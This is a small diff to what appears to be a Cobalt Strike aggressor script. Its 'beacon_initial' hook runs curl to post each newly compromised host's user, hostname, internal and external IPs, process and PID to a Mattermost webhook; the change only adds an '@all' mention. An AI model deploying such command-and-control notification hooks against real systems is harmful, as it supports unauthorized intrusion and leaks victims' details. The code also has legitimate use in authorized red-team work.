@@ -25,7 +25,7 @@ on beacon_initial {
     $process = beacon_data($1)["process"];
     $pid = beacon_data($1)["pid"];
     
-    @curl_command = @('curl','-X','POST','-H', 'Content-Type: application/json', '-d', '{"text": "New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')\n\n--Beacon Details--\n\nExternal: '.$external.'\n\nInternal: '.$internal.'\n\nListener: '.$listener.'\n\nUser: '.$user.'\n\nComputer: '.$computer.'\n\nProccess: '.$process.'\n\nPid: '.$pid.'\n\nArch: '.$arch.'"}', $mattermost_webhookURL);
+    @curl_command = @('curl','-X','POST','-H', 'Content-Type: application/json', '-d', '{"text": "@all New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')\n\n--Beacon Details--\n\nExternal: '.$external.'\n\nInternal: '.$internal.'\n\nListener: '.$listener.'\n\nUser: '.$user.'\n\nComputer: '.$computer.'\n\nProccess: '.$process.'\n\nPid: '.$pid.'\n\nArch: '.$arch.'"}', $mattermost_webhookURL);
     exec(@curl_command);
 }
 
